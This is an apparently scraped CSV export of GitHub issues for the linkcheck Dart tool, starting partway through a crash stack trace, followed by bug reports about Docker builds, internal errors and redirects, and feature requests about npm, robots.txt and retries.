  pc 0x000014ca1d978eab fp 0x000014ca1a37d690 Unknown symbol
  pc 0x000014ca1d926284 fp 0x000014ca1a37d6f8 Unknown symbol
  pc 0x000014ca1d925ed2 fp 0x000014ca1a37d738 Unknown symbol
  pc 0x000014ca1d924b02 fp 0x000014ca1a37d790 Unknown symbol
  pc 0x000014ca1d9247c4 fp 0x000014ca1a37d7c8 Unknown symbol
  pc 0x000014ca1d978a08 fp 0x000014ca1a37d800 Unknown symbol
  pc 0x000014ca1d9788a9 fp 0x000014ca1a37d838 Unknown symbol
  pc 0x000014ca1d978d09 fp 0x000014ca1a37d870 Unknown symbol
  pc 0x000014ca1d9780e9 fp 0x000014ca1a37d8a8 Unknown symbol
  pc 0x000014ca1d977f9a fp 0x000014ca1a37d908 Unknown symbol
  pc 0x000014ca1d977e58 fp 0x000014ca1a37d940 Unknown symbol
  pc 0x000014ca1d926284 fp 0x000014ca1a37d9a8 Unknown symbol
  pc 0x000014ca1d925ed2 fp 0x000014ca1a37d9e8 Unknown symbol
  pc 0x000014ca1d924b02 fp 0x000014ca1a37da40 Unknown symbol
  pc 0x000014ca1d9247c4 fp 0x000014ca1a37da78 Unknown symbol
  pc 0x000014ca1d978a08 fp 0x000014ca1a37dab0 Unknown symbol
  pc 0x000014ca1d9788a9 fp 0x000014ca1a37dae8 Unknown symbol
  pc 0x000014ca1d9787b9 fp 0x000014ca1a37db20 Unknown symbol
  pc 0x000014ca1d978481 fp 0x000014ca1a37db78 Unknown symbol
  pc 0x000014ca1d9780e9 fp 0x000014ca1a37dbb0 Unknown symbol
  pc 0x000014ca1d977f9a fp 0x000014ca1a37dc10 Unknown symbol
  pc 0x000014ca1d977e58 fp 0x000014ca1a37dc48 Unknown symbol
  pc 0x000014ca1d926284 fp 0x000014ca1a37dcb0 Unknown symbol
  pc 0x000014ca1d925ed2 fp 0x000014ca1a37dcf0 Unknown symbol
  pc 0x000014ca1d924b02 fp 0x000014ca1a37dd48 Unknown symbol
  pc 0x000014ca1d9247c4 fp 0x000014ca1a37dd80 Unknown symbol
  pc 0x000014ca1d9480ad fp 0x000014ca1a37ddb8 Unknown symbol
  pc 0x000014ca1d947f0d fp 0x000014ca1a37ddf8 Unknown symbol
  pc 0x000014ca1d947e18 fp 0x000014ca1a37de30 Unknown symbol
  pc 0x000014ca1d926284 fp 0x000014ca1a37de98 Unknown symbol
  pc 0x000014ca1d925ed2 fp 0x000014ca1a37ded8 Unknown symbol
  pc 0x000014ca1d924b02 fp 0x000014ca1a37df30 Unknown symbol
  pc 0x000014ca1d9247c4 fp 0x000014ca1a37df68 Unknown symbol
  pc 0x000014ca1d9245d9 fp 0x000014ca1a37dfa0 Unknown symbol
  pc 0x000014ca1d92442e fp 0x000014ca1a37dfd8 Unknown symbol
  pc 0x000014ca1d924170 fp 0x000014ca1a37e010 Unknown symbol
  pc 0x000014ca1d9436a6 fp 0x000014ca1a37e078 Unknown symbol
  pc 0x000014ca1d97bc57 fp 0x000014ca1a37e118 Unknown symbol
  pc 0x000014ca1d92b95f fp 0x000014ca1a37e180 Unknown symbol
  pc 0x000014ca1d93722f fp 0x000014ca1a37e1b8 Unknown symbol
  pc 0x000014ca1d9370c7 fp 0x000014ca1a37e1f8 Unknown symbol
  pc 0x000014ca1b390b56 fp 0x000014ca1a37e288 Unknown symbol
  pc 0x000014ca1b388535 fp 0x000014ca1a37e2d8 Unknown symbol
  pc 0x000014ca1b3909cd fp 0x000014ca1a37e328 Unknown symbol
  pc 0x000014ca144a983e fp 0x000014ca1a37e370 Unknown symbol
  pc 0x000014ca23ab1b8b fp 0x000014ca1a37e3b0 Unknown symbol
  pc 0x000014ca1d932af2 fp 0x000014ca1a37e400 Unknown symbol
  pc 0x000014ca1d9328eb fp 0x000014ca1a37e440 Unknown symbol
  pc 0x000014ca1b390b56 fp 0x000014ca1a37e4d0 Unknown symbol
  pc 0x000014ca1b388535 fp 0x000014ca1a37e520 Unknown symbol
  pc 0x000014ca1b3909cd fp 0x000014ca1a37e570 Unknown symbol
  pc 0x000014ca144a983e fp 0x000014ca1a37e5b8 Unknown symbol
  pc 0x000014ca23ab1b8b fp 0x000014ca1a37e5f8 Unknown symbol
  pc 0x000014ca1d9652c2 fp 0x000014ca1a37e640 Unknown symbol
  pc 0x000014ca1d964f68 fp 0x000014ca1a37e678 Unknown symbol
  pc 0x000014ca1d95eb70 fp 0x000014ca1a37e6b8 Unknown symbol
  pc 0x000014ca144aa54d fp 0x000014ca1a37e6e8 Unknown symbol
  pc 0x000014ca1d95e173 fp 0x000014ca1a37e778 Unknown symbol
  pc 0x000014ca1d95d371 fp 0x000014ca1a37e7b0 Unknown symbol
  pc 0x000014ca1d95d1fe fp 0x000014ca1a37e7e8 Unknown symbol
  pc 0x000014ca144aa54d fp 0x000014ca1a37e818 Unknown symbol
  pc 0x000014ca1b38d63c fp 0x000014ca1a37e850 Unknown symbol
  pc 0x000014ca28c818ff fp 0x000014ca1a37e8c8 Unknown symbol
  pc 0x0000558a7ff8b322 fp 0x000014ca1a37e960 dart::DartEntry::InvokeCode(dart::Code const&, dart::Array const&, dart::Array const&, dart::Thread*)+0x112
  pc 0x0000558a7ff8b084 fp 0x000014ca1a37e9f0 dart::DartEntry::InvokeFunction(dart::Function const&, dart::Array const&, dart::Array const&, unsigned long)+0x2d4
  pc 0x0000558a7ff8d806 fp 0x000014ca1a37ea40 dart::DartLibraryCalls::HandleMessage(dart::Object const&, dart::Instance const&)+0x1f6
  pc 0x0000558a7ffc5bdc fp 0x000014ca1a37ec30 dart::IsolateMessageHandler::HandleMessage(std::__2::unique_ptr<dart::Message, std::__2::default_delete<dart::Message> >)+0x4cc
  pc 0x0000558a7fff3366 fp 0x000014ca1a37eca0 dart::MessageHandler::HandleMessages(dart::MonitorLocker*, bool, bool)+0x146
  pc 0x0000558a7fff3a1a fp 0x000014ca1a37ed00 dart::MessageHandler::TaskCallback()+0x1da
  pc 0x0000558a80102dd8 fp 0x000014ca1a37ed80 dart::ThreadPool::WorkerLoop(dart::ThreadPool::Worker*)+0x148
  pc 0x0000558a801032ac fp 0x000014ca1a37edb0 dart::ThreadPool::Worker::Main(unsigned long)+0x5c
  pc 0x0000558a8007895d fp 0x000014ca1a37ee70 dart+0x1c3095d
-- End of DumpStackTrace
[exit     : sp(0) fp(0x14ca1a37cd30) pc(0)]
[stub     : sp(0x14ca1a37cd40) fp(0x14ca1a37cd68) pc(0x14ca28c80c1c)]
[dart     : sp(0x14ca1a37cd78) fp(0x14ca1a37cdb8) pc(0x14ca144d9db8) *dart:core_List_List.filled ]
[dart     : sp(0x14ca1a37cdc8) fp(0x14ca1a37ce38) pc(0x14ca144d1717) *dart:collection__ListBase&Object&ListMixin@3220832_toList ]
[dart     : sp(0x14ca1a37ce48) fp(0x14ca1a37ce98) pc(0x14ca1448bfe4) *package:source_span/src/file.dart_SourceFile_SourceFile.decoded ]
[dart     : sp(0x14ca1a37cea8) fp(0x14ca1a37cef0) pc(0x14ca00ec13dc) *package:csslib/parser.dart_::_parse ]
[dart     : sp(0x14ca1a37cf00) fp(0x14ca1a37d0d8) pc(0x14ca00ec1c59) *package:linkcheck/src/parsers/css.dart_::_parseCss ]
[dart     : sp(0x14ca1a37d0e8) fp(0x14ca1a37d178) pc(0x14ca1d97eddb) package:linkcheck/src/worker/worker.dart_::_checkPage__async_op ]
[dart     : sp(0x14ca1a37d188) fp(0x14ca1a37d1d8) pc(0x14ca1b38b015) *dart:async__FutureListener@4048458_handleValue ]
[dart     : sp(0x14ca1a37d1e8) fp(0x14ca1a37d258) pc(0x14ca1b38cf56) *dart:async__Future@4048458__propagateToListeners@4048458_handleValueCallback ]
[dart     : sp(0x14ca1a37d268) fp(0x14ca1a37d2c8) pc(0x14ca1b389566) *dart:async__Future@4048458__propagateToListeners@4048458 ]
[dart     : sp(0x14ca1a37d2d8) fp(0x14ca1a37d310) pc(0x14ca1d94893c) dart:async__Future@4048458__complete@4048458 ]
[dart     : sp(0x14ca1a37d320) fp(0x14ca1a37d350) pc(0x14ca1d9796b6) dart:async_Stream_join_<anonymous closure> ]
[dart     : sp(0x14ca1a37d360) fp(0x14ca1a37d3b8) pc(0x14ca1d926284) dart:async__RootZone@4048458_runGuarded ]
[dart     : sp(0x14ca1a37d3c8) fp(0x14ca1a37d3f8) pc(0x14ca1d925ed2) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458_sendDone ]
[dart     : sp(0x14ca1a37d408) fp(0x14ca1a37d450) pc(0x14ca1d924b02) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37d460) fp(0x14ca1a37d488) pc(0x14ca1d9247c4) dart:async__BufferingStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37d498) fp(0x14ca1a37d4c0) pc(0x14ca1d978a08) dart:async__SinkTransformerStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37d4d0) fp(0x14ca1a37d4f8) pc(0x14ca1d9788a9) dart:async__EventSinkWrapper@4048458_close ]
[dart     : sp(0x14ca1a37d508) fp(0x14ca1a37d530) pc(0x14ca1d9795c9) dart:convert__StringAdapterSink@10003594_close ]
[dart     : sp(0x14ca1a37d540) fp(0x14ca1a37d570) pc(0x14ca1d979147) dart:convert__Utf8ConversionSink@10003594_close ]
[dart     : sp(0x14ca1a37d580) fp(0x14ca1a37d5a8) pc(0x14ca1d9780e9) dart:convert__ConverterStreamEventSink@10003594_close ]
[dart     : sp(0x14ca1a37d5b8) fp(0x14ca1a37d608) pc(0x14ca1d977f9a) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37d618) fp(0x14ca1a37d640) pc(0x14ca1d977e58) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37d650) fp(0x14ca1a37d690) pc(0x14ca1d978eab) dart:_http__HttpClientResponse@17463476_listen_<anonymous closure> ]
[dart     : sp(0x14ca1a37d6a0) fp(0x14ca1a37d6f8) pc(0x14ca1d926284) dart:async__RootZone@4048458_runGuarded ]
[dart     : sp(0x14ca1a37d708) fp(0x14ca1a37d738) pc(0x14ca1d925ed2) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458_sendDone ]
[dart     : sp(0x14ca1a37d748) fp(0x14ca1a37d790) pc(0x14ca1d924b02) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37d7a0) fp(0x14ca1a37d7c8) pc(0x14ca1d9247c4) dart:async__BufferingStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37d7d8) fp(0x14ca1a37d800) pc(0x14ca1d978a08) dart:async__SinkTransformerStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37d810) fp(0x14ca1a37d838) pc(0x14ca1d9788a9) dart:async__EventSinkWrapper@4048458_close ]
[dart     : sp(0x14ca1a37d848) fp(0x14ca1a37d870) pc(0x14ca1d978d09) dart:_http__Uint8ListConversionSink@17463476_close ]
[dart     : sp(0x14ca1a37d880) fp(0x14ca1a37d8a8) pc(0x14ca1d9780e9) dart:convert__ConverterStreamEventSink@10003594_close ]
[dart     : sp(0x14ca1a37d8b8) fp(0x14ca1a37d908) pc(0x14ca1d977f9a) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37d918) fp(0x14ca1a37d940) pc(0x14ca1d977e58) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37d950) fp(0x14ca1a37d9a8) pc(0x14ca1d926284) dart:async__RootZone@4048458_runGuarded ]
[dart     : sp(0x14ca1a37d9b8) fp(0x14ca1a37d9e8) pc(0x14ca1d925ed2) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458_sendDone ]
[dart     : sp(0x14ca1a37d9f8) fp(0x14ca1a37da40) pc(0x14ca1d924b02) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37da50) fp(0x14ca1a37da78) pc(0x14ca1d9247c4) dart:async__BufferingStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37da88) fp(0x14ca1a37dab0) pc(0x14ca1d978a08) dart:async__SinkTransformerStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37dac0) fp(0x14ca1a37dae8) pc(0x14ca1d9788a9) dart:async__EventSinkWrapper@4048458_close ]
[dart     : sp(0x14ca1a37daf8) fp(0x14ca1a37db20) pc(0x14ca1d9787b9) dart:convert__ByteAdapterSink@10003594_close ]
[dart     : sp(0x14ca1a37db30) fp(0x14ca1a37db78) pc(0x14ca1d978481) dart:io__FilterSink@15069316_close ]
[dart     : sp(0x14ca1a37db88) fp(0x14ca1a37dbb0) pc(0x14ca1d9780e9) dart:convert__ConverterStreamEventSink@10003594_close ]
[dart     : sp(0x14ca1a37dbc0) fp(0x14ca1a37dc10) pc(0x14ca1d977f9a) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37dc20) fp(0x14ca1a37dc48) pc(0x14ca1d977e58) dart:async__SinkTransformerStreamSubscription@4048458__handleDone@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37dc58) fp(0x14ca1a37dcb0) pc(0x14ca1d926284) dart:async__RootZone@4048458_runGuarded ]
[dart     : sp(0x14ca1a37dcc0) fp(0x14ca1a37dcf0) pc(0x14ca1d925ed2) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458_sendDone ]
[dart     : sp(0x14ca1a37dd00) fp(0x14ca1a37dd48) pc(0x14ca1d924b02) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37dd58) fp(0x14ca1a37dd80) pc(0x14ca1d9247c4) dart:async__BufferingStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37dd90) fp(0x14ca1a37ddb8) pc(0x14ca1d9480ad) dart:async__ForwardingStream@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37ddc8) fp(0x14ca1a37ddf8) pc(0x14ca1d947f0d) dart:async__ForwardingStreamSubscription@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37de08) fp(0x14ca1a37de30) pc(0x14ca1d947e18) dart:async__ForwardingStreamSubscription@4048458__handleDone@4048458__handleDone@4048458 ]
[dart     : sp(0x14ca1a37de40) fp(0x14ca1a37de98) pc(0x14ca1d926284) dart:async__RootZone@4048458_runGuarded ]
[dart     : sp(0x14ca1a37dea8) fp(0x14ca1a37ded8) pc(0x14ca1d925ed2) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458_sendDone ]
[dart     : sp(0x14ca1a37dee8) fp(0x14ca1a37df30) pc(0x14ca1d924b02) dart:async__BufferingStreamSubscription@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37df40) fp(0x14ca1a37df68) pc(0x14ca1d9247c4) dart:async__BufferingStreamSubscription@4048458__close@4048458 ]
[dart     : sp(0x14ca1a37df78) fp(0x14ca1a37dfa0) pc(0x14ca1d9245d9) dart:async__SyncStreamController@4048458__sendDone@4048458 ]
[dart     : sp(0x14ca1a37dfb0) fp(0x14ca1a37dfd8) pc(0x14ca1d92442e) dart:async__StreamController@4048458__closeUnchecked@4048458 ]
[dart     : sp(0x14ca1a37dfe8) fp(0x14ca1a37e010) pc(0x14ca1d924170) dart:async__StreamController@4048458_close ]
[dart     : sp(0x14ca1a37e020) fp(0x14ca1a37e078) pc(0x14ca1d9436a6) dart:_http__HttpParser@17463476__closeIncoming@17463476 ]
[dart     : sp(0x14ca1a37e088) fp(0x14ca1a37e118) pc(0x14ca1d97bc57) *dart:_http__HttpParser@17463476__doParse@17463476 ]
[dart     : sp(0x14ca1a37e128) fp(0x14ca1a37e180) pc(0x14ca1d92b95f) dart:_http__HttpParser@17463476__parse@17463476 ]
[dart     : sp(0x14ca1a37e190) fp(0x14ca1a37e1b8) pc(0x14ca1d93722f) dart:_http__HttpParser@17463476__onData@17463476 ]
[dart     : sp(0x14ca1a37e1c8) fp(0x14ca1a37e1f8) pc(0x14ca1d9370c7) dart:_http__HttpParser@17463476__onData@17463476__onData@17463476 ]
[dart     : sp(0x14ca1a37e208) fp(0x14ca1a37e288) pc(0x14ca1b390b56) *dart:async__RootZone@4048458_runUnaryGuarded ]
[dart     : sp(0x14ca1a37e298) fp(0x14ca1a37e2d8) pc(0x14ca1b388535) *dart:async__BufferingStreamSubscription@4048458__sendData@4048458 ]
[dart     : sp(0x14ca1a37e2e8) fp(0x14ca1a37e328) pc(0x14ca1b3909cd) *dart:async__SyncStreamController@4048458__sendData@4048458 ]
[dart     : sp(0x14ca1a37e338) fp(0x14ca1a37e370) pc(0x14ca144a983e) *dart:async__StreamController@4048458__add@4048458 ]
[dart     : sp(0x14ca1a37e380) fp(0x14ca1a37e3b0) pc(0x14ca23ab1b8b) dart:async__StreamController@4048458_add ]
[dart     : sp(0x14ca1a37e3c0) fp(0x14ca1a37e400) pc(0x14ca1d932af2) dart:io__Socket@15069316__onData@15069316 ]
[dart     : sp(0x14ca1a37e410) fp(0x14ca1a37e440) pc(0x14ca1d9328eb) dart:io__Socket@15069316__onData@15069316__onData@15069316 ]
[dart     : sp(0x14ca1a37e450) fp(0x14ca1a37e4d0) pc(0x14ca1b390b56) *dart:async__RootZone@4048458_runUnaryGuarded ]
[dart     : sp(0x14ca1a37e4e0) fp(0x14ca1a37e520) pc(0x14ca1b388535) *dart:async__BufferingStreamSubscription@4048458__sendData@4048458 ]
[dart     : sp(0x14ca1a37e530) fp(0x14ca1a37e570) pc(0x14ca1b3909cd) *dart:async__SyncStreamController@4048458__sendData@4048458 ]
[dart     : sp(0x14ca1a37e580) fp(0x14ca1a37e5b8) pc(0x14ca144a983e) *dart:async__StreamController@4048458__add@4048458 ]
[dart     : sp(0x14ca1a37e5c8) fp(0x14ca1a37e5f8) pc(0x14ca23ab1b8b) dart:async__StreamController@4048458_add ]
[dart     : sp(0x14ca1a37e608) fp(0x14ca1a37e640) pc(0x14ca1d9652c2) dart:io__RawSecureSocket@15069316__sendReadEvent@15069316 ]
[dart     : sp(0x14ca1a37e650) fp(0x14ca1a37e678) pc(0x14ca1d964f68) dart:io__RawSecureSocket@15069316__sendReadEvent@15069316__sendReadEvent@15069316 ]
[dart     : sp(0x14ca1a37e688) fp(0x14ca1a37e6b8) pc(0x14ca1d95eb70) dart:async_Timer__createTimer@4048458_<anonymous closure> ]
[dart     : sp(0x14ca1a37e6c8) fp(0x14ca1a37e6e8) pc(0x14ca144aa54d) *dart:core__Closure@0150898_dyn_call ]
[dart     : sp(0x14ca1a37e6f8) fp(0x14ca1a37e778) pc(0x14ca1d95e173) dart:isolate__Timer@1026248__runTimers@1026248 ]
[dart     : sp(0x14ca1a37e788) fp(0x14ca1a37e7b0) pc(0x14ca1d95d371) dart:isolate__Timer@1026248__handleMessage@1026248 ]
[dart     : sp(0x14ca1a37e7c0) fp(0x14ca1a37e7e8) pc(0x14ca1d95d1fe) dart:isolate__Timer@1026248__handleMessage@1026248__handleMessage@1026248 ]
[dart     : sp(0x14ca1a37e7f8) fp(0x14ca1a37e818) pc(0x14ca144aa54d) *dart:core__Closure@0150898_dyn_call ]
[dart     : sp(0x14ca1a37e828) fp(0x14ca1a37e850) pc(0x14ca1b38d63c) *dart:isolate__RawReceivePortImpl@1026248__handleMessage@1026248 ]
[entry    : sp(0x14ca1a37e860) fp(0x14ca1a37e8c8) pc(0x14ca28c818ff)]
Aborted",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/68/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/68/comments,https://api.github.com/repos/filiph/linkcheck/issues/68/events,https://github.com/filiph/linkcheck/issues/68,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/67,792761482,MDU6SXNzdWU3OTI3NjE0ODI=,67,Bug: Couldn't process Docker on Windows,1650647,open,FALSE,NA,NA,1,2021-01-24T10:05:25Z,2021-04-04T05:12:08Z,NA,NONE,NA,"## Expected Behavior

Installation doesn't end with an error, and the `filiph/linkcheck` could be executed.

## Actual Behavior

Instalation `docker build -t filiph/linkcheck .` falls:

```bash
#1 [internal] load build definition from Dockerfile
#1 sha256:250bdb75e69446fa4cc66d19de6b2c2e1e1d56028719c8719be5ba4473780b3b
#1 transferring dockerfile: 2B 0.0s done
#1 DONE 0.0s

#2 [internal] load .dockerignore
#2 sha256:f42f4b6001b85d056ce810a191359e178133fc940326f0b50498b4041d1db136
#2 transferring context:
#2 CANCELED
failed to solve with frontend dockerfile.v0: failed to read dockerfile: open /var/lib/docker/tmp/buildkit-mount636110485/Dockerfile: no such file or directory
```

## Steps to Reproduce

1. check if Docker is running
3. execute in CLI `docker build -t filiph/linkcheck .`

## Context (Environment)

* Version: [2.0.15+1](https://github.com/filiph/linkcheck/releases/tag/v2.0.15%2B1)
* Platform: Windows 10; Git Bash; Docker version 20.10.2, build 2291f61",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/67/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/67/comments,https://api.github.com/repos/filiph/linkcheck/issues/67/events,https://github.com/filiph/linkcheck/issues/67,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/66,792747711,MDU6SXNzdWU3OTI3NDc3MTE=,66,Feature request: maintain npm package,1650647,closed,FALSE,NA,NA,1,2021-01-24T08:37:39Z,2021-01-28T06:02:22Z,2021-01-28T06:02:22Z,NONE,NA,"Hi,

what do you think about the official npm package? I found this https://www.npmjs.com/package/dart-linkcheck ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/66/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/66/comments,https://api.github.com/repos/filiph/linkcheck/issues/66/events,https://github.com/filiph/linkcheck/issues/66,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/65,792746501,MDU6SXNzdWU3OTI3NDY1MDE=,65,Docs: Does `linkcheck` processes / respect `robots.txt?,1650647,closed,FALSE,NA,NA,3,2021-01-24T08:28:47Z,2021-02-04T04:49:50Z,2021-02-04T04:48:33Z,NONE,NA,"Hi, I'm not sure if `linkcheck` **respect `robots.txt`**. The sentence in the README.md isn't clear to me.

`It goes without saying that linkcheck honors robots.txt and throttles itself when accessing websites.`

If processes will be nice to have a parameter to avoid this behaviour. 
Example: Some pages are disabled in `robots.txt`, but should be checked.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/65/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/65/comments,https://api.github.com/repos/filiph/linkcheck/issues/65/events,https://github.com/filiph/linkcheck/issues/65,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/64,792387713,MDExOlB1bGxSZXF1ZXN0NTYwMjgwMDkx,64,Improve behavior around `--show-redirects`,484309,closed,FALSE,NA,NA,1,2021-01-23T00:24:44Z,2021-01-25T18:05:08Z,2021-01-23T02:52:57Z,CONTRIBUTOR,NA,"PR #54 added a `--show-redirects` flag! But the implementation didn't seem quite complete: 

- It adds a redirects count to the summary, but it won't show the details about WHICH links were redirected
unless there was *also* at least one error or warning. So if you want to
actually update your redirected links, you need to temporarily break an
unrelated link first. 😆
- If you _didn't_ want info on redirects, you get spammed with it anyway whenever an unrelated error or warning triggers a full-detail report.
- Redirects aren't detectable in the exit code.

So, this PR has a commit to deal with each of those. ",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/64/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/64/comments,https://api.github.com/repos/filiph/linkcheck/issues/64/events,https://github.com/filiph/linkcheck/pull/64,https://api.github.com/repos/filiph/linkcheck/pulls/64
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/63,791326201,MDU6SXNzdWU3OTEzMjYyMDE=,63,internal error in _RawReceivePortImpl,22439451,closed,FALSE,NA,NA,1,2021-01-21T16:52:21Z,2021-01-22T06:38:50Z,2021-01-22T06:38:13Z,NONE,NA,"Hey.. thanks for your great tool which we're using in an internal pipeline to check our documentation.. Today we noticed the following failure in a docker container built off  google/dart with `RUN pub global activate linkcheck` crawling an adjacent container web server.
 
This error seems to be intermittent, can't give more info than provided in below:

```
+ docker-compose -f docker-compose-utils.yml run linkcheck bash -c linkcheck --no-nice --skip-file jenkins/linkcheck-ignore http://cxta_docs_ext:8080

Creating cxta_docs_ext ... 
Creating cxta_docs_ext ... done
Crawling...
INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Bad state: No element

#0      SetMixin.singleWhere (dart:collection/set.dart:267:5)
#1      crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:255:20)
#2      _rootRunUnary (dart:async/zone.dart:1198:47)
#3      _CustomZone.runUnary (dart:async/zone.dart:1100:19)
#4      _CustomZone.runUnaryGuarded (dart:async/zone.dart:1005:7)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:357:11)
#6      _DelayedData.perform (dart:async/stream_impl.dart:611:14)
#7      _StreamImplEvents.handleNext (dart:async/stream_impl.dart:730:11)
#8      _PendingEvents.schedule.<anonymous closure> (dart:async/stream_impl.dart:687:7)
#9      _rootRun (dart:async/zone.dart:1182:47)
#10     _CustomZone.run (dart:async/zone.dart:1093:19)
#11     _CustomZone.runGuarded (dart:async/zone.dart:997:7)
#12     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:1037:23)
#13     _rootRun (dart:async/zone.dart:1190:13)
#14     _CustomZone.run (dart:async/zone.dart:1093:19)
#15     _CustomZone.runGuarded (dart:async/zone.dart:997:7)
#16     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:1037:23)
#17     _microtaskLoop (dart:async/schedule_microtask.dart:41:21)
#18     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50:5)
#19     _runPendingImmediateCallback (dart:isolate-patch/isolate_patch.dart:118:13)
#20     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:169:5)
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/63/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/63/comments,https://api.github.com/repos/filiph/linkcheck/issues/63/events,https://github.com/filiph/linkcheck/issues/63,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/62,775592089,MDU6SXNzdWU3NzU1OTIwODk=,62,Bad state: No element,5852957,closed,FALSE,NA,NA,0,2020-12-28T21:22:13Z,2021-01-02T15:37:16Z,2021-01-02T15:37:16Z,NONE,NA,"#0      SetMixin.singleWhere (dart:collection/set.dart:267:5)
#1      crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:255:20)
#2      _rootRunUnary (dart:async/zone.dart:1198:47)
#3      _CustomZone.runUnary (dart:async/zone.dart:1100:19)
#4      _CustomZone.runUnaryGuarded (dart:async/zone.dart:1005:7)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:357:11)
#6      _DelayedData.perform (dart:async/stream_impl.dart:611:14)
#7      _StreamImplEvents.handleNext (dart:async/stream_impl.dart:730:11)
#8      _PendingEvents.schedule.<anonymous closure> (dart:async/stream_impl.dart:687:7)
#9      _rootRun (dart:async/zone.dart:1182:47)
#10     _CustomZone.run (dart:async/zone.dart:1093:19)
#11     _CustomZone.runGuarded (dart:async/zone.dart:997:7)
#12     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:1037:23)
#13     _rootRun (dart:async/zone.dart:1190:13)
#14     _CustomZone.run (dart:async/zone.dart:1093:19)
#15     _CustomZone.runGuarded (dart:async/zone.dart:997:7)
#16     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:1037:23)
#17     _microtaskLoop (dart:async/schedule_microtask.dart:41:21)
#18     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50:5)
#19     _runPendingImmediateCallback (dart:isolate-patch/isolate_patch.dart:118:13)
#20     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:169:5)",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/62/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/62/comments,https://api.github.com/repos/filiph/linkcheck/issues/62/events,https://github.com/filiph/linkcheck/issues/62,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/61,772466004,MDU6SXNzdWU3NzI0NjYwMDQ=,61,Retries for potentially transient errors,4017646,open,FALSE,NA,NA,1,2020-12-21T21:14:57Z,2021-01-22T17:42:02Z,NA,NONE,NA,"First of all, thank you for this great tool, it's saved me a heap of time.

Occasionally, linkcheck will fail because an external site returned a HTTP 503 or something like that. It would be great if linkcheck could be configured to retry in this case rather than failing the entire invocation because one site is down. ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/61/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/61/comments,https://api.github.com/repos/filiph/linkcheck/issues/61/events,https://github.com/filiph/linkcheck/issues/61,NA
